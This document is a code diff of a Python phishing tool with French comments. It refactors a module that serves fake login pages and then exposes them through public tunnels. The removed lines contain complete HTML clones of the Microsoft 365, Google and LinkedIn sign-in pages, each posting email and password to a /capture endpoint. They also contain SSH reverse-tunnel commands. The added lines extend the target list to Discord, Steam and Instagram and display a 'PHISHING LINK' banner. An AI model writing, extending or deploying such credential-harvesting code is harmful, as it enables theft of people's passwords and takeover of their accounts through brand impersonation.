@@ -27,141 +27,30 @@ from rich.rule    import Rule
 from rich         import box
 
 # ─── TEMPLATES ───────────────────────────────────────────────
+# Les HTML sont dans modules/phish_templates/*.html
 
-TEMPLATES = {
-    "microsoft": {
-        "name":     "Microsoft 365",
-        "redirect": "https://login.microsoftonline.com",
-        "color":    "#0078d4",
-        "logo":     "Microsoft",
-        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
-<title>Sign in to your account</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-*{{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}}
-body{{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}}
-.card{{background:#fff;padding:44px 44px 36px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}}
-.logo{{font-size:1.4rem;font-weight:600;color:#1b1b1b;margin-bottom:24px}}
-h2{{font-size:1.5rem;font-weight:400;color:#1b1b1b;margin-bottom:8px}}
-p{{color:#605e5c;font-size:.875rem;margin-bottom:24px}}
-input{{width:100%;border:1px solid #8a8886;padding:8px 10px;font-size:.9rem;margin-bottom:16px;outline:none}}
-input:focus{{border-color:#0078d4;border-width:2px}}
-.btn{{background:#0078d4;color:#fff;border:none;width:100%;padding:10px;font-size:1rem;cursor:pointer}}
-.btn:hover{{background:#005a9e}}
-.footer{{margin-top:16px;font-size:.75rem;color:#605e5c;text-align:center}}
-</style></head><body>
-<div class="card">
-  <div class="logo">&#11036; Microsoft</div>
-  <h2>Sign in</h2>
-  <p>Use your Microsoft account</p>
-  <form method="POST" action="/capture">
-    <input name="email" type="email" placeholder="Email, phone, or Skype" required>
-    <input name="password" type="password" placeholder="Password" required>
-    <button class="btn" type="submit">Sign in</button>
-  </form>
-  <div class="footer"><a href="#">Can't access your account?</a></div>
-</div></body></html>""",
-    },
-    "google": {
-        "name":     "Google",
-        "redirect": "https://accounts.google.com",
-        "color":    "#4285f4",
-        "logo":     "Google",
-        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
-<title>Sign in – Google accounts</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-*{{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,sans-serif}}
-body{{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}}
-.card{{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:450px}}
-.logo{{font-size:2rem;color:#5f6368;margin-bottom:24px;text-align:center}}
-h2{{text-align:center;font-size:1.5rem;color:#202124;margin-bottom:8px}}
-p{{text-align:center;color:#5f6368;font-size:.875rem;margin-bottom:24px}}
-.field{{position:relative;margin-bottom:24px}}
-label{{font-size:.75rem;color:#5f6368;display:block;margin-bottom:4px}}
-input{{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:1rem;outline:none}}
-input:focus{{border-color:#1a73e8;border-width:2px}}
-.btn{{background:#1a73e8;color:#fff;border:none;border-radius:4px;width:100%;padding:10px;font-size:.875rem;cursor:pointer}}
-.btn:hover{{background:#1557b0}}
-.footer{{margin-top:24px;text-align:right}}
-</style></head><body>
-<div class="card">
-  <div class="logo"><b style="color:#4285f4">G</b><b style="color:#ea4335">o</b><b style="color:#fbbc05">o</b><b style="color:#4285f4">g</b><b style="color:#34a853">l</b><b style="color:#ea4335">e</b></div>
-  <h2>Sign in</h2>
-  <p>Use your Google Account</p>
-  <form method="POST" action="/capture">
-    <div class="field"><label>Email or phone</label><input name="email" type="email" required></div>
-    <div class="field"><label>Password</label><input name="password" type="password" required></div>
-    <div class="footer"><button class="btn" type="submit">Next</button></div>
-  </form>
-</div></body></html>""",
-    },
-    "linkedin": {
-        "name":     "LinkedIn",
-        "redirect": "https://www.linkedin.com",
-        "color":    "#0a66c2",
-        "logo":     "LinkedIn",
-        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
-<title>LinkedIn: Log In or Sign Up</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-*{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}}
-body{{background:#f3f2ef;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding-top:40px}}
-.brand{{font-size:2rem;font-weight:700;color:#0a66c2;margin-bottom:24px}}
-.card{{background:#fff;border-radius:8px;padding:24px;width:400px;box-shadow:0 4px 12px rgba(0,0,0,.15)}}
-h2{{font-size:1.5rem;margin-bottom:20px;color:#000}}
-label{{font-size:.875rem;color:#666;display:block;margin-bottom:4px}}
-input{{width:100%;border:1px solid #ccc;border-radius:4px;padding:12px;font-size:1rem;margin-bottom:16px;outline:none}}
-input:focus{{border-color:#0a66c2}}
-.btn{{background:#0a66c2;color:#fff;border:none;border-radius:24px;width:100%;padding:14px;font-size:1rem;font-weight:600;cursor:pointer}}
-.btn:hover{{background:#004182}}
-</style></head><body>
-<div class="brand">in LinkedIn</div>
-<div class="card">
-  <h2>Sign in</h2>
-  <form method="POST" action="/capture">
-    <label>Email or phone</label>
-    <input name="email" type="text" required>
-    <label>Password</label>
-    <input name="password" type="password" required>
-    <button class="btn" type="submit">Sign in</button>
-  </form>
-</div></body></html>""",
-    },
-    "generic": {
-        "name":     "Generic Login",
-        "redirect": "https://example.com",
-        "color":    "#00ff41",
-        "logo":     "Portal",
-        "html": """<!DOCTYPE html><html><head><meta charset="utf-8">
-<title>Secure Login Portal</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-*{{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}}
-body{{background:#0a0f0a;display:flex;justify-content:center;align-items:center;min-height:100vh}}
-.card{{background:#0d1a0d;border:1px solid #00ff41;padding:40px;width:420px}}
-.logo{{color:#00ff41;font-size:1.2rem;margin-bottom:24px;text-align:center}}
-h2{{color:#00ff41;text-align:center;margin-bottom:24px;font-size:1rem;letter-spacing:.2em}}
-label{{color:#00e5ff;font-size:.8rem;display:block;margin-bottom:6px}}
-input{{width:100%;background:#0a0f0a;border:1px solid #00ff41;color:#00ff41;padding:10px;font-size:.9rem;margin-bottom:18px;outline:none;font-family:inherit}}
-input:focus{{border-color:#00e5ff}}
-.btn{{background:#00ff41;color:#0a0f0a;border:none;width:100%;padding:12px;font-size:.9rem;font-weight:700;cursor:pointer;letter-spacing:.1em}}
-.status{{color:#00e5ff;font-size:.75rem;text-align:center;margin-top:12px}}
-</style></head><body>
-<div class="card">
-  <div class="logo">[ SECURE PORTAL ]</div>
-  <h2>AUTHENTICATION REQUIRED</h2>
-  <form method="POST" action="/capture">
-    <label>USERNAME / EMAIL</label>
-    <input name="email" type="text" required>
-    <label>PASSWORD</label>
-    <input name="password" type="password" required>
-    <button class="btn" type="submit">AUTHENTICATE</button>
-  </form>
-  <div class="status">🔒 256-bit encrypted</div>
-</div></body></html>""",
-    },
+_TPL_DIR = os.path.join(os.path.dirname(__file__), "phish_templates")
+
+_TPL_META = {
+    "microsoft": {"name": "Microsoft 365",  "redirect": "https://login.microsoftonline.com"},
+    "google":    {"name": "Google",          "redirect": "https://accounts.google.com"},
+    "linkedin":  {"name": "LinkedIn",        "redirect": "https://www.linkedin.com"},
+    "discord":   {"name": "Discord",         "redirect": "https://discord.com/login"},
+    "steam":     {"name": "Steam",           "redirect": "https://store.steampowered.com/login"},
+    "instagram": {"name": "Instagram",       "redirect": "https://www.instagram.com/accounts/login"},
+    "generic":   {"name": "Secure Portal",   "redirect": "https://example.com"},
 }
+
+def _load_tpl(key: str) -> str:
+    path = os.path.join(_TPL_DIR, f"{key}.html")
+    try:
+        with open(path, encoding="utf-8") as f:
+            return f.read()
+    except FileNotFoundError:
+        err(f"Template introuvable: {path}")
+        return "<h1>Template not found</h1>"
+
+TEMPLATES = {k: {**v, "html": _load_tpl(k)} for k, v in _TPL_META.items()}
 
 # ─── SERVER ──────────────────────────────────────────────────
 
@@ -221,48 +110,8 @@ def _save_log(entry: dict):
     with open(logfile, "a", encoding="utf-8") as f:
         f.write(json.dumps(entry) + "\n")
 
-# ─── TUNNEL ──────────────────────────────────────────────────
-
-TUNNELS = {
-    "serveo":      ("serveo.net",       "ssh -R 80:localhost:{port} serveo.net -o StrictHostKeyChecking=no"),
-    "localhostrun": ("localhost.run",    "ssh -R 80:localhost:{port} nokey@localhost.run -o StrictHostKeyChecking=no"),
-    "bore":        ("bore.pub",         "bore local {port} --to bore.pub"),
-}
-
-def _start_tunnel(kind: str, port: int) -> subprocess.Popen | None:
-    if kind not in TUNNELS:
-        return None
-    name, cmd_tmpl = TUNNELS[kind]
-    cmd = cmd_tmpl.format(port=port)
-    info(f"Starting tunnel via [{CY}]{name}[/]...")
-    info(f"  [{DM}]CMD: {cmd}[/]")
-    try:
-        proc = subprocess.Popen(
-            cmd, shell=True,
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True, bufsize=1
-        , encoding="utf-8")
-        return proc
-    except Exception as e:
-        err(f"Tunnel launch failed: {e}")
-        return None
-
-def _read_tunnel_url(proc: subprocess.Popen, timeout: int = 15) -> str:
-    """Lis la sortie du process tunnel pour trouver l'URL publique"""
-    url_pattern = re.compile(r"https?://[a-zA-Z0-9._\-]+(?:\.\w+)+(?:/\S*)?")
-    start = time.time()
-    while time.time() - start < timeout:
-        line = proc.stdout.readline()
-        if not line:
-            time.sleep(0.2)
-            continue
-        line = line.strip()
-        if line:
-            console.print(f"  [{DM}][tunnel] {line}[/]")
-        m = url_pattern.search(line)
-        if m:
-            return m.group(0)
-    return ""
+# ─── TUNNEL — via core/tunnel.py ─────────────────────────────
+from core.tunnel import print_tunnel_menu, start_tunnel as _start_tunnel_core
 
 # ─── MAIN ────────────────────────────────────────────────────
 
@@ -283,15 +132,15 @@ def run():
 
     # ── Choose template ─────────────────────────────────────────
     console.print(Rule(f"[{CY}] TEMPLATE ", style=G2))
-    console.print(f"  [{G1}][1][/] Microsoft 365")
-    console.print(f"  [{G1}][2][/] Google")
-    console.print(f"  [{G1}][3][/] LinkedIn")
-    console.print(f"  [{G1}][4][/] Generic portal")
-    console.print(f"  [{G1}][5][/] Custom HTML file")
+    _tpl_keys = list(_TPL_META.keys())  # ordre du dict
+    for i, k in enumerate(_tpl_keys, 1):
+        console.print(f"  [{G1}][{i}][/] {_TPL_META[k]['name']}")
+    custom_idx = len(_tpl_keys) + 1
+    console.print(f"  [{G1}][{custom_idx}][/] Custom HTML file")
     tmpl_choice = ask_choice("Template", "1")
 
     global _custom_html, _redirect
-    if tmpl_choice == "5":
+    if tmpl_choice == str(custom_idx):
         path = Prompt.ask(f"  [{G1}]◈ HTML file path[/]").strip()
         if not os.path.isfile(path):
             err(f"File not found: {path}"); return
@@ -300,7 +149,8 @@ def run():
         _redirect = Prompt.ask(f"  [{G1}]◈ Redirect URL after capture[/]",
                                default="https://example.com").strip()
     else:
-        key = {"1":"microsoft","2":"google","3":"linkedin","4":"generic"}.get(tmpl_choice,"generic")
+        idx = int(tmpl_choice) - 1 if tmpl_choice.isdigit() else 0
+        key = _tpl_keys[idx] if 0 <= idx < len(_tpl_keys) else _tpl_keys[0]
         tmpl = TEMPLATES[key]
         _custom_html = tmpl["html"]
         _redirect    = tmpl["redirect"]
@@ -314,14 +164,8 @@ def run():
     # ── Tunnel service ──────────────────────────────────────────
     console.print()
     console.print(Rule(f"[{CY}] TUNNEL ", style=G2))
-    console.print(f"  [{G1}][1][/] serveo.net       (SSH, no install)")
-    console.print(f"  [{G1}][2][/] localhost.run    (SSH, no install)")
-    console.print(f"  [{G1}][3][/] bore.pub         (requires: pip install bore / cargo install bore-cli)")
-    console.print(f"  [{G1}][4][/] No tunnel        (LAN only — http://YOUR_IP:{port})")
+    print_tunnel_menu()
     tunnel_choice = ask_choice("Tunnel", "1")
-
-    tunnel_keys  = {"1":"serveo","2":"localhostrun","3":"bore"}
-    tunnel_key   = tunnel_keys.get(tunnel_choice)
 
     # ── Start HTTP server ───────────────────────────────────────
     console.print()
@@ -336,25 +180,21 @@ def run():
     ok(f"Server running on port [{G1}]{port}[/]")
 
     # ── Start tunnel ────────────────────────────────────────────
-    public_url = ""
+    public_url  = ""
     tunnel_proc = None
-    if tunnel_key:
-        tunnel_proc = _start_tunnel(tunnel_key, port)
-        if tunnel_proc:
-            info(f"Waiting for tunnel URL (up to 20s)...")
-            public_url = _read_tunnel_url(tunnel_proc, timeout=20)
-            if public_url:
-                find(f"Public URL: [{G1}]{public_url}[/]")
-                console.print()
-                console.print(Panel(
-                    f"[bold {G1}]{public_url}[/]",
-                    title=f"[{CY}]◈ PHISHING LINK ◈",
-                    border_style=RD, padding=(1,4)
-                ))
-            else:
-                warn("Could not parse public URL from tunnel output.")
-                warn("Check tunnel output above for the URL manually.")
-    else:
+    if tunnel_choice != "5":
+        tunnel_proc, public_url = _start_tunnel_core(tunnel_choice, port)
+        if public_url:
+            find(f"Public URL: [{G1}]{public_url}[/]")
+            console.print()
+            console.print(Panel(
+                f"[bold {G1}]{public_url}[/]",
+                title=f"[{CY}]◈ PHISHING LINK ◈",
+                border_style=RD, padding=(1,4)
+            ))
+        elif tunnel_choice != "5":
+            warn("URL introuvable — vérifie la sortie tunnel ci-dessus.")
+    if not public_url:
         try:
             local_ip = socket.gethostbyname(socket.gethostname())
         except Exception:
